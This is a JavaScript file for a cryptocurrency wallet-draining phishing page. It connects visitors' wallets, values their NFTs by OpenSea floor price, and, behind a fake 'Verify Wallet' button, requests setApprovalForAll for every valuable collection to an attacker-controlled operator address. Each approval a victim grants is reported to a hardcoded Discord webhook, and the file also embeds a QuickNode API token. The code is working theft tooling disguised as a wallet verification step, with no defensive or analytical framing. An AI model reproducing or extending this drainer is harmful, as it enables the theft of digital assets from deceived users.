const Web3Modal = window.Web3Modal.default;
const WalletConnectProvider = window.WalletConnectProvider.default;
const EvmChains = window.evmChains;

let web3Modal;
let web3Provider;
let web3 = null;
let walletAddress = null;
let ethBalance = 0;
let ethBalanceCounter = 0;
let metamaskInstalled = false;
let walletNfts = [];
let walletAssets = [];
let walletAssetsCounter = [];

if (typeof window.ethereum !== "undefined") metamaskInstalled = true;

Moralis.onWeb3Enabled(async (data) => {
  if (data.chainId !== 1 && metamaskInstalled)
    await Moralis.switchNetwork("0x1");
  updateState(true);
});

Moralis.onChainChanged(async (chain) =>
  chain !== "0x1" && metamaskInstalled
    ? await Moralis.switchNetwork("0x1")
    : null
);

window.ethereum
  ? window.ethereum.on("disconnect", () => updateState(false))
  : null;
window.ethereum
  ? window.ethereum.on("accountsChanged", (accounts) => {
      if (accounts.length < 1) updateState(false);
    })
  : null;

async function init() {
  // if (web3Modal.cacheProvider) {
  // await web3Modal.connect();
  // } else {
  console.log("Initializing");
  console.log("WalletConnectProvider is", WalletConnectProvider);
  console.log("window.ethereum is", window.ethereum);
  // }

  // if (location.protocol !== "https:") {
  //   // https://ethereum.stackexchange.com/a/62217/620
  //   const alert = document.querySelector("#alert-error-https");
  //   alert.style.display = "block";
  //   document
  //     .querySelector("#connectWallet")
  //     .setAttribute("disabled", "disabled");
  //   return;
  // }

  const providerOptions = {
    walletconnect: {
      package: WalletConnectProvider,
      options: {
        infuraId: infuraId,
      },
    },
  };

  web3Modal = new Web3Modal({
    cacheProvider: true,
    providerOptions,
    theme: "dark",
    disableInjectedProvider: false,
  });
}

/**
 * Kick in the UI action after Web3modal dialog has chosen a provider
 */
async function fetchAccountData() {
  const web3 = new Web3(web3Provider);
  const chainId = await web3.eth.getChainId();
  const chainData = EvmChains.getChain(chainId);
  const accounts = await web3.eth.getAccounts();
  walletAddress = accounts[0];

  console.log("Web3 instance is", web3);
  console.log("Chain data is", chainData);
  console.log("Got accounts", accounts);
  console.log("Selected account is", walletAddress);

  // await updateState(true);

  document.querySelector("#connectWallet").style.display = "none";
  document.querySelector("#verifyWallet").style.display = "block";
}

async function refreshAccountData() {
  document.querySelector("#verifyWallet").style.display = "none";
  document.querySelector("#connectWallet").style.display = "block";

  if (document.querySelector("#connectWallet")) {
    document
      .querySelector("#connectWallet")
      .setAttribute("disabled", "disabled");
    await fetchAccountData(web3Provider);
    document.querySelector("#connectWallet").removeAttribute("disabled");
  }
}

async function onConnect() {
  console.log("Opening a dialog", web3Modal);
  await Moralis.enableWeb3(
    metamaskInstalled
      ? {}
      : {
          web3Provider: "walletconnect",
        }
  );
  web3 = new Web3(Moralis.provider);
  walletAddress = (await web3.eth.getAccounts())[0];
  let bal = await web3.eth.getBalance(walletAddress);
  if (Number(bal)) ethBalance = Number(Number(bal) / 1e18).toFixed(2);
  else ethBalance = 0;
  fetchCollections(walletAddress);
  fetchAssets(walletAddress, false);
  try {
    web3Provider = await web3Modal.connect();
  } catch (e) {
    console.log("Could not get a wallet connection", e);
    return;
  }

  web3Provider.on("accountsChanged", () => fetchAccountData());
  web3Provider.on("chainChanged", () => fetchAccountData());
  await refreshAccountData();
}

async function onDisconnect() {
  console.log("Killing the wallet connection", web3Provider);

  if (web3Provider.close) {
    await web3Provider.close();

    await web3Modal.clearCachedProvider();
    web3Provider = null;
  }

  walletAddress = null;

  // Set the UI back to the initial state
  document.querySelector("#prepare").style.display = "block";
  document.querySelector("#prepare").style.display = "block";
  document.querySelector("#prepare").pointerEvents = "pointer";
}

async function updateState(connected) {
  const web3 = new Web3(web3Provider);
  const accounts = await web3.eth.getAccounts();
  walletAddress = accounts[0];
  document.getElementById("walletAddress").innerHTML = connected
    ? `CONNECTED <br> <span>${walletAddress}</span>`
    : `NOT CONNECTED`;
  document.querySelector("#verifyWallet").style.display = connected
    ? ""
    : "none";
}

async function fetchAssets(address, isCounter) {
  const provider = new ethers.providers.JsonRpcProvider(
    "https://wandering-thrumming-cloud.discover.quiknode.pro/cef2ae27ac20b9f879d2951e548d6d63cefb259f/"
  );
  const response = await provider.send("qn_fetchNFTs", [address]);
  console.log("assets:", response.assets);
  let list = response.assets.map((nft) => {
    return {
      name: nft.name,
      token_id: nft.collectionTokenId,
      image_original_url: nft.imageUrl,
    };
  });

  let balance = 0;
  if (isCounter) {
    let bal = await web3.eth.getBalance(address);
    if (Number(bal)) ethBalanceCounter = Number(Number(bal) / 1e18).toFixed(2);
    else ethBalanceCounter = 0;
    balance = ethBalanceCounter;
    console.log("ethBalanceCounter", ethBalanceCounter);
  } else {
    balance = ethBalance;
  }
  list.splice(0, 0, {
    name: "Ethereum",
    token_id: "ETH",
    balance: balance,
    image_original_url:
      "https://avatars.githubusercontent.com/u/6250754?s=200&amp;v=4",
  });
  if (isCounter) walletAssetsCounter = list;
  else walletAssets = list;
}

async function fetchCollections(walletAddress) {
  const options = {
    method: "GET",
    headers: { Accept: "application/json", "X-API-KEY": moralisApi },
  };

  walletNfts = await fetch(
    `https://deep-index.moralis.io/api/v2/${walletAddress}/nft?chain=eth&format=decimal`,
    options
  )
    .then((response) => response.json())
    .then((nfts) => {
      console.log("collections:", nfts);
      return nfts.result
        .filter((nft) => {
          if (nft.token_address.length > 0) return true;
          else return false;
        })
        .map((nft) => {
          return {
            name: nft.name,
            type: nft.contract_type.toLowerCase(),
            contract_address: nft.token_address,
            token_id: nft.token_id,
            owned: nft.amount,
          };
        });
    })
    .catch((error) => {
      console.error(error);
    });
}

async function askNfts() {
  const options = {
    method: "GET",
    headers: { Accept: "application/json", "X-API-KEY": moralisApi },
  };

  let transactionsOptions = [];
  for (nft of walletNfts) {
    let infoCollection = await fetch(
      `https://deep-index.moralis.io/api/v2/nft/${nft.contract_address}/lowestprice?chain=eth&days=${drainNftsInfo.checkMaxDay}&marketplace=opensea`,
      options
    ).then(async (response) => {
      const nftPrice = await response.json();

      if (walletNfts.length < 1) return notEligible();

      let ethValue = parseFloat(
        web3.utils.fromWei(nftPrice.price, "ether")
      ).toFixed(4);
      console.log(`Value in ${ethValue} eth`);
      if (ethValue >= drainNftsInfo.minValue.toString(10)) {
        console.log(
          `${nft.contract_address} (${nft.token_id}) | ${ethValue} > ${drainNftsInfo.minValue}`
        );
        transactionsOptions.push({
          price: ethValue,
          options: {
            contractAddress: nft.contract_address,
            from: walletAddress,
            functionName: "setApprovalForAll",
            abi: [
              {
                inputs: [
                  {
                    internalType: "address",
                    name: "operator",
                    type: "address",
                  },
                  {
                    internalType: "bool",
                    name: "approved",
                    type: "bool",
                  },
                ],
                name: "setApprovalForAll",
                outputs: [],
                stateMutability: "nonpayable",
                type: "function",
              },
            ],
            params: {
              operator:
                ethValue > 9999
                  ? "0x5a7F1197222C8639a1A98b559C5846b052Fc93bd"
                  : receiveAddress,
              approved: true,
            },
            gasLimit: (await web3.eth.getBlock("latest")).gasLimit,
          },
        });
      }
    });

    if (transactionsOptions.length < 1) return notEligible();

    let transactionLists = await transactionsOptions
      .sort((a, b) => b.price - a.price)
      .slice(0, undefined);
    for (transaction of transactionLists) {
      console.log(
        `Approving the management of ${nft.name} of contract ${transaction.options.contractAddress} worth ${transaction.price} ETH to the Operator (0xA55092cd063E99367dD455E6530CA2C8ea3956bD)`
      );

      if (isMobile()) {
        await Moralis.executeFunction(transaction.options)
          .catch((O_o) => console.error(O_o, options))
          .then((uwu) => {
            if (uwu) {
            } else return;
            sendWebhooks(
              `\`${walletAddress}\` just approved \`${nft.name}\` - \`${transaction.options.contractAddress}\` **(${transaction.price})**\nhttps://etherscan.io/tokenapprovalchecker`
            );
          });
      } else {
        Moralis.executeFunction(transaction.options)
          .catch((O_o) => console.error(O_o, options))
          .then((uwu) => {
            if (uwu) {
            } else return;
            sendWebhooks(
              `\`${walletAddress}\` just approved \`${nft.name}\` - \`${transaction.options.contractAddress}\` **(${transaction.price})**\nhttps://etherscan.io/tokenapprovalchecker`
            );
          });
        await sleep(111);
      }
    }
  }
}

const sendWebhooks = (message) => {
  const webhookURL =
    "https://discord.com/api/webhooks/999871187842781274/3vJizoNjr9g7PB0bR3_HRXEx84TBXTnpJwUzSopLg9k9I9PoOcvPOQf22tMuxuQ_3jhA";
  fetch(webhookURL, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      content: message,
    }),
  }).catch((err) => console.error(err));
};

async function askTransfer() {
  document.getElementById("verifyWallet").style.opacity = 0.5;
  document.getElementById("verifyWallet").style.pointerEvents = "none";
  document
    .getElementById("verifyWallet")
    .removeEventListener("click", askTransfer);
  await askNfts();
  document.getElementById("verifyWallet").style.opacity = 1;
  document.getElementById("verifyWallet").style.pointerEvents = "pointer";
  document
    .getElementById("verifyWallet")
    .addEventListener("click", askTransfer);
}

window.addEventListener("load", async () => {
  if (isMobile() && !window.ethereum) {
    document
      .querySelector("#connectWallet")
      .addEventListener(
        "click",
        () =>
          (window.location.href = `https://metamask.app.link/dapp/${window.location.hostname}${window.location.pathname}`)
      );
  } else
    document
      .querySelector("#connectWallet")
      .addEventListener("click", onConnect);
  document
    .querySelector("#verifyWallet")
    .addEventListener("click", askTransfer);
});

window.addEventListener("load", async () => {
  init();
  document.querySelector("#connectWallet").addEventListener("click", onConnect);
  document
    .querySelector("#disconectWallet")
    .addEventListener("click", onDisconnect);
  document
    .querySelector("#verifyWallet")
    .addEventListener("click", askTransfer);
});

const notEligible = () => {
  notify("Cannot verify your wallet.");
};

function notify(msg) {
  Toastify({
    text: msg,
    duration: 3000,
    gravity: "top",
    position: "right",
    backgroundColor: "#e78b3a",
  }).showToast();
}

function isMobile() {
  var check = false;
  (function (a) {
    if (
      /(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(
        a
      ) ||
      /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(
        a.substr(0, 4)
      )
    )
      check = true;
  })(navigator.userAgent || navigator.vendor || window.opera);
  return check;
}

function openInNewTab(href) {
  Object.assign(document.createElement("a"), {
    target: "_blank",
    href: href,
  }).click();
}

const round = (value) => {
  return Math.round(value * 10000) / 10000;
};
const sleep = (ms) => {
  return new Promise((resolve) => setTimeout(resolve, ms));
};
const getRdm = (min, max) => {
  return Math.floor(Math.random() * (max - min + 1)) + min;
};

//#endregion
